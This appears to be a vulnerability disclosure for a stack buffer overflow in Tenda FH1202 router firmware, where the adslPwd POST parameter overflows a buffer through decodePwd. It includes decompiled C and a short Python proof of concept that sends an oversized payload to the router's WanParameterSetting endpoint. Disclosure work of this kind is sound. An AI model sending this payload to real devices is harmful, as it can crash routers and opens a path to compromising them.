## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) firmware has a stack overflow vulnerability located in the `formWanParameterSetting` function. This function accepts the `wanType`and `connect` parameter from a POST request. Within `v4 == 2`, this function accepts the `adslPwd` parameter from a POST request, which is assigned to `decodePwd(v11, v15);`. However, since the user has control over the input of `adslPwd`, the function `decodePwd()` leads to a buffer overflow. The user-supplied `adslPwd` can exceed the capacity of the `v15` array, thus triggering this security vulnerability.

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410144504996.png)

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410144434686.png)

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410144449758.png)

```c
_BYTE *__fastcall decodePwd(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // $v0
  _BYTE *v3; // [sp+8h] [+8h]
  _BYTE *v4; // [sp+Ch] [+Ch]

  v3 = a1;
  v4 = a2;
  result = a1;
  if ( a1 )
  {
    result = a2;
    if ( a2 )
    {
      while ( *v3 )
      {
        if ( *v3 == 92 )
          ++v3;
        *v4++ = *v3++;
      }
      result = v4;
      *v4 = 0;
    }
  }
  return result;
}
```

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WanParameterSetting"
payload = b"a"*1000

data = {"wanType":"2","connect":"1","adslPwd": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409102339559](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409102339559.png)